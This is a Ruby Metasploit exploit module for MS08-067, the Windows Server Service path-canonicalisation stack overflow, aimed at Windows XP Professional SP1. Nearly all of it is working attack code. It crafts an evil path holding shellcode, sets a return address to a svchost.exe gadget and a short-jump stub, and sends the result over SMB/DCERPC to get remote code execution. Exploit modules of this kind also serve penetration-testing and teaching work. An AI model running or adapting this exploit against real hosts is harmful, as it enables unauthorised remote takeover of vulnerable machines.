##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'MS08-067 Microsoft Server Service Relative Path Stack Corruption',
        'Description' => %q{
          Just support Windows XP Professional SP1.
        },
        'Author' => [
          'BinRacer',
        ],
        'License' => MSF_LICENSE,
        'DefaultOptions' => {
          'EXITFUNC' => 'thread',
        },
        'Privileged' => true,
        'Payload' => {
          'Space' => 408,
          'BadChars' => "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40",
          'Prepend' => "\x81\xE4\xF0\xFF\xFF\xFF", # stack alignment
          'StackAdjustment' => -3500,

        },
        'DefaultTarget' => 0,
        'Targets' => [
          # msf6 > msfpescan -j esi svchost.exe
          # [*] exec: msfpescan -j esi svchost.exe
          # [svchost.exe]
          # 0x01001361 call esi
          # msf6 > 
          [
            'Windows XP Professional SP1',
            {
              'Ret' => 0x01001361,
            }
          ], # JMP ESI SVCHOST.EXE
        ],
        'Platform' => 'win',
      )
    )

    register_options(
      [
        OptString.new('SMBPIPE', [true, 'The pipe name to use (BROWSER, SRVSVC)', 'BROWSER']),
      ]
    )

    deregister_options('SMB::ProtocolVersion')
  end

  def hex_dump(data, bytes_per_line = 16)
    lines = []
    offset = 0
    # Convert data to byte array
    bytes = data.respond_to?(:bytes) ? data.bytes : data
    bytes.each_slice(bytes_per_line) do |chunk|
      # Calculate line number and offset
      line_num = offset / bytes_per_line
      hex_offset = offset
      # Generate hexadecimal string
      hex_str = chunk.map { |b| "%02x" % b }.join(' ')
      # Pad hex part to fixed width
      hex_padding = '   ' * (bytes_per_line - chunk.size)
      hex_line = hex_str + hex_padding
      # Generate ASCII representation
      ascii_str = chunk.map { |b| 
        (32..126).include?(b) ? b.chr : '.' 
      }.join
      # Combine all parts with consistent formatting
      lines << "%04d: %08X  %s  |%s|" % [line_num, hex_offset, hex_line, ascii_str]
      offset += chunk.size
    end
    lines.join("\n")
  end

  def exploit
    begin
      connect(versions: [1])
      smb_login
    rescue Rex::Proto::SMB::Exceptions::LoginError => e
      if e.message =~ /Connection reset/
        print_error('Connection reset during login')
        print_error('This most likely means a previous exploit attempt caused the service to crash')
        return
      else
        raise e
      end
    end

    #
    # Build the evil path name
    #

    prefix = '\\'
    path = ''
    server = Rex::Text.rand_text_alpha(rand(8) + 1).upcase

    shellcode = payload.encoded
    vprint_status("shellcode:")
    vprint_status("  length: #{shellcode.length} bytes")
    vprint_status("  hex dump:\n" + hex_dump(shellcode))

    path =
      Rex::Text.to_unicode('\\') +
      # This buffer is removed from the front
      'B' * 100 +
      # search the start of shellcode
      'S' * 16 +
      # Shellcode
      shellcode +
      # search the end of shellcode
      'E' * 16 +
      # Relative path to trigger the bug
      Rex::Text.to_unicode('\\..\\..\\') +
      # Extra padding
      Rex::Text.to_unicode('A' * 7) +
      # Writable memory location (static)
      'P' * 4 + # EBP
      # Return to embedded jump
      [target.ret].pack('V') + # ret addr
      # Padding with embedded jump
      'D' * 50 +
      # eb 72 = jmp short shellcode = 当前指令地址 + offset 0x72 + 0x2(跳转本身长度)
      "\xeb\x72" +
      # Padding
      'D' * 18 +
      # NULL termination
      "\x00" * 2

    vprint_status("evil path:")
    vprint_status("  length: #{path.length} bytes")
    vprint_status("  hex dump:\n" + hex_dump(path))

    handle = dcerpc_handle(
      '4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0',
      'ncacn_np', ["\\#{datastore['SMBPIPE']}"]
    )

    vprint_status("DCERPC handle bind: #{handle}")

    dcerpc_bind(handle)

    vprint_status("build stub payload...")
    stub =
      NDR.uwstring(server) +
      NDR.UnicodeConformantVaryingStringPreBuilt(path) +
      NDR.long(rand(1024)) +
      NDR.wstring(prefix) +
      NDR.long(4097) +
      NDR.long(0)
    
    vprint_status("stub payload:")
    vprint_status("  length: #{stub.length} bytes")
    vprint_status("  hex dump:\n" + hex_dump(stub))

    # NOTE: we don't bother waiting for a response here...
    print_status('Attempting to trigger the vulnerability...')
    dcerpc.call(0x1f, stub, false)

    # Cleanup
    handler
    disconnect
  end
end